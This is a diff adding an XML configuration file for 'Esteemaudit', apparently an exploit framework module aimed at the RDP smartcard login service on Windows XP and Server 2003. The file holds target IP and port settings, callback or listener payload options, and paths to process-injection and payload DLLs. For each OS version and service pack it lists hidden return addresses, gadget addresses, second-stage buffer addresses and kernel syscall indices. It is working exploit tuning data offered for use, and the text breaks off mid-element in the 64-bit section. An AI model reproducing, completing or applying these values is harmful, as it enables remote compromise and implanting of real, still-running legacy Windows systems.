@@ -1,0 +1,866 @@
+<?xml version='1.0' encoding='utf-8'?>
+<config xmlns='urn:trch' name='Esteemaudit' version='2.1.0' schemaversion='2.1.0' configversion='2.1.0.0' id='2a7d82545aa7bdf8b44ee403dbebf2b360f55b3a'>
+  <inputparameters>
+    <parameter type='IPv4' name='TargetIp' description='Target IP Address'/>
+    <parameter type='TcpPort' name='TargetPort' description='Port used by the RDP service'>
+      <default>3389</default>
+    </parameter>
+    <parameter type='S16' name='NetworkTimeout' description='Timeout for connect() calls including egg callback'>
+      <default>60</default>
+    </parameter>
+    <parameter type='S16' name='PacketTimeout' description='Timeout for each RDP packet.'>
+      <default>10</default>
+    </parameter>
+    <parameter type='U32' name='MaxProcessCount' description='The maximum number of RDP process loops to allow'>
+      <default>300</default>
+    </parameter>
+    <parameter type='U32' name='RdpLibHertz' description='Extrapolated RdpLib processing cycles per second.'>
+      <default>30</default>
+    </parameter>
+    <parameter hidden='true' type='Boolean' name='SendSpacebar' description='Whether to send spacebar to clear legal text caption or not'>
+      <default>true</default>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ProcessCountToSendSpaceOn' description='Process loop to clear the legal text caption on'>
+      <default>3</default>
+    </parameter>
+    <parameter hidden='true' type='U32' name='MaxRDPLibErrorCount' description='Maximum number of RDPLib errors to allow'>
+      <default>3</default>
+    </parameter>
+    <paramchoice name='Payload' description='How the egg will behave'>
+      <default>Callback</default>
+      <paramgroup name='Callback' description='The egg will callback to the specified IP and Port'>
+        <parameter type='IPv4' name='CallbackIp' description='Callback IP address the egg will connect to from target'/>
+        <parameter type='TcpPort' name='CallbackPort' description='Callback port that the egg will connect to from target'>
+          <default>0</default>
+        </parameter>
+        <parameter required='false' type='TcpPort' name='CallbackLocalPort' description='Callback port that we will listen on to receive the eggs connection'/>
+      </paramgroup>
+      <paramgroup name='Listener' description='The egg will open up a new listening port.'>
+        <parameter type='TcpPort' name='ListenPort' description='Port the egg will listen on'/>
+        <parameter required='false' type='TcpPort' name='CallinPort' description='Port we connect to'/>
+      </paramgroup>
+    </paramchoice>
+    <paramchoice name='Architecture' description='Architecture of the target'>
+      <paramgroup name='x86' description='Target is running on an x86 processor'>
+        <parameter type='LocalFile' name='MigrateProcessDLL' description=' The DLL that will be used to inject into a remote process'>
+          <default>D:\DSZOPSDISK\storage\rudo_x86.dll</default>
+        </parameter>
+        <parameter type='LocalFile' name='CallbackPayloadDLL' description='The DLL that will be used as a callback payload'>
+          <default>D:\DSZOPSDISK\storage\capa_x86.dll</default>
+        </parameter>
+        <parameter type='LocalFile' name='ListenPayloadDLL' description='The DLL that will be used as a listen payload'>
+          <default>D:\DSZOPSDISK\storage\lipa_x86.dll</default>
+        </parameter>
+        <paramchoice name='Target' description='OS and Service pack of the target'>
+          <paramgroup name='XPSP0' description='Windows XP SP0'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe37120</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='XPSP1' description='Windows XP SP1'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe37120</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='XPSP0|1' description='Windows XP SP0 or SP1'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe37120</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='XPSP2' description='Windows XP SP2'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe25158</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0fe2ab2d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x0fe266b8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x00000089</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0fe3342a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x44</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='XPSP3' description='Windows XP SP3'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe25158</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0fe2ab2d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x0fe266b8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x00000089</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0fe3342a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x44</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='XPSP2|3' description='Windows XP SP2 or SP3'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe370b0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe25158</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0fe2ab2d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0x0fe27243</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x0fe266b8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x00000089</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0fe3342a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x44</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE372B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF94DB0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE21178</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000011</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000053</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='W2K3SP0' description='Windows 2003 SP0'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0fe380f8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0fe38168</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FE382F8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF95DF8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FE211B4</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FE211A8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000012</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000057</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='W2K3SP1' description='Windows 2003 SP1'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x080190D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x08005e85</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0800bedd</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x08011e7a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0x0801118e</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0x08011fef</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x080128cc</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0000008f</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x08015074</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x40</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x080192D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x08176DD8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0800119C</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x080011CC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000012</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000057</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='W2K3SP2' description='Windows 2003 SP2'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x080190D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x08005e85</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0800bedd</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x08011e7a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0x0801118e</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0x08011fef</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x080128cc</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0000008f</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x08015074</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x40</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x080192D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x08176DD8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0800119C</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x080011CC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000012</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000057</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='W2K3SP1|2' description='Windows 2003 SP1 or SP2'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x080190D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x08005e85</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0800bedd</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x08011e7a</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0x0801118e</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0x08011fef</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x080128cc</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0000008f</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x08015074</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x40</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x080192D8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x08176DD8</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0800119C</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x080011CC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtAllocateVirtualMemory_Index' description='Index of NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000012</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtAllocateVirtualMemory_ArgSize' description='Size of stack arguments to NtAllocateVirtualMemory() in nt!KiServiceTable'>
+              <default>0x18</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='KiServiceTable_NtFreeVirtualMemory_Index' description='Index of NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x00000057</default>
+            </parameter>
+            <parameter hidden='true' type='U16' name='KiServiceTable_NtFreeVirtualMemory_ArgSize' description='Size of stack arguments to NtFreeVirtualMemory() in nt!KiServiceTable'>
+              <default>0x10</default>
+            </parameter>
+          </paramgroup>
+        </paramchoice>
+      </paramgroup>
+      <paramgroup name='x86 64-bit' description='Target is running on an x86 64-bit processor'>
+        <parameter type='LocalFile' name='MigrateProcessDLL' description=' The DLL that will be used to inject into a remote process'>
+          <default>D:\DSZOPSDISK\storage\rudo_x64.dll</default>
+        </parameter>
+        <parameter type='LocalFile' name='CallbackPayloadDLL' description='The DLL that will be used as a callback payload'>
+          <default>D:\DSZOPSDISK\storage\capa_x64.dll</default>
+        </parameter>
+        <parameter type='LocalFile' name='ListenPayloadDLL' description='The DLL that will be used as a listen payload'>
+          <default>D:\DSZOPSDISK\storage\lipa_x64.dll</default>
+        </parameter>
+        <paramchoice name='Target' description='Suspected OS and language pack'>
+          <default>Other|64</default>
+          <paramgroup name='Eng|Jpn|64' description='English/Japanese 64-bit XP/2003'>
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0FDC9870</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0FDBE483</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0FDC28CC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x0FDB0EDC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0x0FDC2BE7</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0x0FDBC9C9</default>
